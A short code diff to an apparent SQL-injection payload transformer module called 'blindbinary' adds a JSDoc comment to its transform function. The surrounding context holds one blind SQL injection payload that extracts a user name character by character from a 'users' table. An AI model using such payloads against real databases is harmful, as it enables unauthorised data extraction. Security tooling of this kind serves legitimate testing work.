@@ -87,6 +87,10 @@ export const blindbinary = {
       output: '1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40',
     },
   ],
+  /**
+   * @param {string} payload
+   * @returns {string}
+   */
   transform(payload) {
     let s = String(payload ?? '');
     if (!s) return s;
